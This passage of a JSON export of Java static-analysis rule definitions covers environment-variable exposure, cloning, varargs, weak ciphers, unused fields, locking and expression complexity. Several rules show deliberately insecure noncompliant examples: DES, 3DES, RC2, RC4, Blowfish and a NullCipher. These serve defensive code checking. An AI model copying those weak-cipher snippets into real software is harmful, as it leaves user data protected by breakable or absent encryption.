debug mode if it has access to sensitive information, including environment variables.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class Main {\n    public static void main (String[] args) {\n        System.getenv();  // Sensitive\n        System.getenv(\"myvar\");  // Sensitive\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Map&lt;String, String&gt; environment = processBuilder.environment();  // Sensitive\n        environment.put(\"VAR\", \"value\");\n\n        Runtime.getRuntime().exec(\"ping\", new String[]{\"env=val\"});   // Sensitive\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/526.html\">MITRE, CWE-526</a> - Information Exposure Through Environmental Variables </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/74.html\">MITRE, CWE-74</a> - Improper Neutralization of Special Elements in Output Used by a\n  Downstream Component ('Injection') </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using environment variables is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278\">CVE-2014-6278</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3464\">CVE-2019-3464</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000402\">CVE-2018-1000402</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10530\">CVE-2016-10530</a> </li>\n</ul>\n<p>Environment variables are sensitive to injection attacks, just like any other input.</p>\n<p>Note also that environment variables can be exposed in multiple ways, storing sensitive information in them should be done carefully:</p>\n<ul>\n  <li> on Unix systems environment variables of one process can be read by another process running with the same UID. </li>\n  <li> environment variables <a href=\"https://docs.oracle.com/javase/tutorial/essential/environment/env.html\">might be forwarded to child\n  processes</a>. </li>\n  <li> application running in debug mode often exposes their environment variable. </li>\n</ul>\n<p>This rule raises an issue when environment variables are read.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Environment variables are used without being sanitized. </li>\n  <li> You store sensitive information in environment variables and other processes might be able to access them. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize every environment variable before using its value.</p>\n<p>If you store sensitive information in an environment variable, make sure that no other process can access them, i.e. the process runs with a\nseparate user account and child processes don't have access to their parent's environment.</p>\n<p>Don't run your application in debug mode if it has access to sensitive information, including environment variables.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class Main {\n    public static void main (String[] args) {\n        System.getenv();  // Sensitive\n        System.getenv(\"myvar\");  // Sensitive\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Map&lt;String, String&gt; environment = processBuilder.environment();  // Sensitive\n        environment.put(\"VAR\", \"value\");\n\n        Runtime.getRuntime().exec(\"ping\", new String[]{\"env=val\"});   // Sensitive\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/526.html\">MITRE, CWE-526</a> - Information Exposure Through Environmental Variables </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/74.html\">MITRE, CWE-74</a> - Improper Neutralization of Special Elements in Output Used by a\n  Downstream Component ('Injection') </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2157",
            "repo": "java",
            "name": "\"Cloneables\" should implement \"clone\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Simply implementing <code>Cloneable</code> without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While\nthe <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability.\nOtherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e.\nwithout overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>\n<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a\nclass to be copied.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Team implements Cloneable {  // Noncompliant\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) {...}\n  public Person getCoach() {...}\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Team implements Cloneable {\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) { ... }\n  public Person getCoach() { ... }\n\n  @Override\n  public Object clone() {\n    Team clone = (Team) super.clone();\n    //...\n  }\n}\n</pre>",
            "mdDesc": "<p>Simply implementing <code>Cloneable</code> without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While\nthe <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability.\nOtherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e.\nwithout overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>\n<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a\nclass to be copied.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Team implements Cloneable {  // Noncompliant\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) {...}\n  public Person getCoach() {...}\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Team implements Cloneable {\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) { ... }\n  public Person getCoach() { ... }\n\n  @Override\n  public Object clone() {\n    Team clone = (Team) super.clone();\n    //...\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "api-design",
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5669",
            "repo": "java",
            "name": "Vararg method arguments should not be confusing",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Passing single <code>null</code> or primitive array argument to the variable arity method may not work as expected. In the case of\n<code>null</code>, it is not passed as array with single element, but the argument itself is <code>null</code>. In the case of a primitive array, if\nthe formal parameter is <code>Object...</code>, it is passed as a single element array. This may not be obvious to someone not familiar with such\ncorner cases, and it is probably better to avoid such ambiguities by explicitly casting the argument to the desired type.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg(null);  // Noncompliant, prints \"null\"\n    int[] arr = {1,2,3};\n    vararg(arr);  // Noncompliant, prints \"length: 1\"\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\");\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg((Object) null); // prints 1\n    Object[] arr = {1,2,3};\n    vararg(arr); // prints 3\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\"); // not reached\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>Passing single <code>null</code> or primitive array argument to the variable arity method may not work as expected. In the case of\n<code>null</code>, it is not passed as array with single element, but the argument itself is <code>null</code>. In the case of a primitive array, if\nthe formal parameter is <code>Object...</code>, it is passed as a single element array. This may not be obvious to someone not familiar with such\ncorner cases, and it is probably better to avoid such ambiguities by explicitly casting the argument to the desired type.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg(null);  // Noncompliant, prints \"null\"\n    int[] arr = {1,2,3};\n    vararg(arr);  // Noncompliant, prints \"length: 1\"\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\");\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg((Object) null); // prints 1\n    Object[] arr = {1,2,3};\n    vararg(arr); // prints 3\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\"); // not reached\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2278",
            "repo": "java",
            "name": "Neither DES (Data Encryption Standard) nor DESede (3DES) should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer\n  provides the security that is needed to protect federal government information.</p>\n  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<p>For similar reasons, RC2 should also be avoided.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c = Cipher.getInstance(\"DESede/ECB/PKCS5Padding\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE\">DES / DESede Unsafe</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5547'>S5547</a> instead.</p>",
            "mdDesc": "<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer\n  provides the security that is needed to protect federal government information.</p>\n  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<p>For similar reasons, RC2 should also be avoided.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c = Cipher.getInstance(\"DESede/ECB/PKCS5Padding\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE\">DES / DESede Unsafe</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5547} instead.</p>",
            "severity": "BLOCKER",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a6",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1068",
            "repo": "java",
            "name": "Unused \"private\" fields should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will\nimprove maintainability because developers will not wonder what the variable is used for.</p>\n<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only\naccessed using the reflection API.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private int foo = 42;\n\n  public int compute(int a) {\n    return a * 42;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  public int compute(int a) {\n    return a * 42;\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during\ndeserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to\nserialization.</p>\n<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that\nmust be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:</p>\n<pre>\npublic class MyClass implements java.io.Serializable {\n  private static final long serialVersionUID = 42L;\n}\n</pre>\n<p>Moreover, this rule doesn't raise any issue on annotated fields.</p>",
            "mdDesc": "<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will\nimprove maintainability because developers will not wonder what the variable is used for.</p>\n<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only\naccessed using the reflection API.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private int foo = 42;\n\n  public int compute(int a) {\n    return a * 42;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  public int compute(int a) {\n    return a * 42;\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during\ndeserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to\nserialization.</p>\n<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that\nmust be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:</p>\n<pre>\npublic class MyClass implements java.io.Serializable {\n  private static final long serialVersionUID = 42L;\n}\n</pre>\n<p>Moreover, this rule doesn't raise any issue on annotated fields.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2276",
            "repo": "java",
            "name": "\"wait(...)\" should be used instead of \"Thread.sleep(...)\" when a lock is held",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance and scalability issues, or even\nworse to deadlocks because the execution of the thread holding the lock is frozen. It's better to call <code>wait(...)</code> on the monitor object to\ntemporarily release the lock and allow other threads to run.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      Thread.sleep(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      monitor.wait(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTdGBQ\">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a lock </li>\n</ul>",
            "mdDesc": "<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance and scalability issues, or even\nworse to deadlocks because the execution of the thread holding the lock is frozen. It's better to call <code>wait(...)</code> on the monitor object to\ntemporarily release the lock and allow other threads to run.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      Thread.sleep(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      monitor.wait(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTdGBQ\">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a lock </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading",
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5547",
            "repo": "java",
            "name": "Cipher algorithms should be robust",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><a href=\"https://en.wikipedia.org/wiki/Strong_cryptography\">Strong cipher algorithms</a> are cryptographic systems resistant to cryptanalysis, they\nare not vulnerable to well-known attacks like brute force attacks for example.</p>\n<p>A general recommendation is to only use cipher algorithms intensively tested and promoted by the cryptographic community.</p>\n<p>More specifically for block cipher, it's not recommended to use algorithm with a block size inferior than 128 bits.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic class test {\n\n    public static void main(String[] args) {\n      try\n      {\n        Cipher c1 = Cipher.getInstance(\"DES\"); // Noncompliant: DES works with 56-bit keys allow attacks via exhaustive search\n        Cipher c7 = Cipher.getInstance(\"DESede\"); // Noncompliant: Triple DES is vulnerable to meet-in-the-middle attack\n        Cipher c13 = Cipher.getInstance(\"RC2\"); // Noncompliant: RC2 is vulnerable to a related-key attack\n        Cipher c19 = Cipher.getInstance(\"RC4\"); // Noncompliant: vulnerable to several attacks (see https://en.wikipedia.org/wiki/RC4#Security)\n        Cipher c25 = Cipher.getInstance(\"Blowfish\"); // Noncompliant: Blowfish use a 64-bit block size makes it vulnerable to birthday attacks\n\n        NullCipher nc = new NullCipher(); // Noncompliant: the NullCipher class provides an \"identity cipher\" one that does not transform or encrypt the plaintext in any way.\n      }\n      catch(NoSuchAlgorithmException|NoSuchPaddingException e)\n      {\n      }\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic class test {\n\n    public static void main(String[] args) {\n      try\n      {\n        Cipher c31 = Cipher.getInstance(\"AES/GCM/NoPadding\"); // Compliant\n      }\n      catch(NoSuchAlgorithmException|NoSuchPaddingException e)\n      {\n      }\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p><a href=\"https://en.wikipedia.org/wiki/Strong_cryptography\">Strong cipher algorithms</a> are cryptographic systems resistant to cryptanalysis, they\nare not vulnerable to well-known attacks like brute force attacks for example.</p>\n<p>A general recommendation is to only use cipher algorithms intensively tested and promoted by the cryptographic community.</p>\n<p>More specifically for block cipher, it's not recommended to use algorithm with a block size inferior than 128 bits.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic class test {\n\n    public static void main(String[] args) {\n      try\n      {\n        Cipher c1 = Cipher.getInstance(\"DES\"); // Noncompliant: DES works with 56-bit keys allow attacks via exhaustive search\n        Cipher c7 = Cipher.getInstance(\"DESede\"); // Noncompliant: Triple DES is vulnerable to meet-in-the-middle attack\n        Cipher c13 = Cipher.getInstance(\"RC2\"); // Noncompliant: RC2 is vulnerable to a related-key attack\n        Cipher c19 = Cipher.getInstance(\"RC4\"); // Noncompliant: vulnerable to several attacks (see https://en.wikipedia.org/wiki/RC4#Security)\n        Cipher c25 = Cipher.getInstance(\"Blowfish\"); // Noncompliant: Blowfish use a 64-bit block size makes it vulnerable to birthday attacks\n\n        NullCipher nc = new NullCipher(); // Noncompliant: the NullCipher class provides an \"identity cipher\" one that does not transform or encrypt the plaintext in any way.\n      }\n      catch(NoSuchAlgorithmException|NoSuchPaddingException e)\n      {\n      }\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic class test {\n\n    public static void main(String[] args) {\n      try\n      {\n        Cipher c31 = Cipher.getInstance(\"AES/GCM/NoPadding\"); // Compliant\n      }\n      catch(NoSuchAlgorithmException|NoSuchPaddingException e)\n      {\n      }\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S5663",
            "repo": "java",
            "name": "Simple string literal should be used for single line strings",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a string fits on a single line, without concatenation and escaped newlines, you should probably continue to use a string literal.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString question = \"\"\"\n              What's the point, really?\"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString question = \"What's the point, really?\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "mdDesc": "<p>If a string fits on a single line, without concatenation and escaped newlines, you should probably continue to use a string literal.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString question = \"\"\"\n              What's the point, really?\"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString question = \"What's the point, really?\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java14"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1067",
            "repo": "java",
            "name": "Expressions should not be too complex",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>\noperators it contains.</p>\n<p>A single expression's complexity should not become too high to keep the code readable.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold value of 3:</p>\n<pre>\nif (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported inside <code>equals</code> methods, because it is common to compare all the fields of a class for equality inside this kind of\nmethod.</p>",
            "mdDesc": "<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>\noperators it contains.</p>\n<p>A single expression's complexity should not become too high to keep the code readable.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold value of 3:</p>\n<pre>\nif (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported inside <code>equals</code> methods, because it is common to compare all the fields of a class for equality inside this kind of\nmethod.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum number of allowed conditional operators in an expression",
                    "defaultValue": "3",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "1min",
            "defaultDebtRemFnOffset": "5min",
            "effortToFixDescription": "per complexity point above the threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
